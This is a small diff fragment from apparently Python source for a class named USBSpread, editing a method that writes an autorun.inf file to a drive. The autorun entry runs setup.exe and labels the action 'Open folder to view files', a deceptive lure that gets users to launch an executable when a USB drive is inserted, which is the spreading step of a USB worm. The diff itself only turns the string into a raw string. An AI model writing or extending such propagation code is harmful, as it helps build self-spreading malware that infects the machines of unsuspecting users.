@@ -185,7 +185,7 @@ class USBSpread:
     
     def create_autorun_inf(self, drive_path):
         """Create autorun.inf file."""
-        autorun_content = '''[AutoRun]
+        autorun_content = r'''[AutoRun]
 open=setup.exe
 icon=setup.exe
 action=Open folder to view files
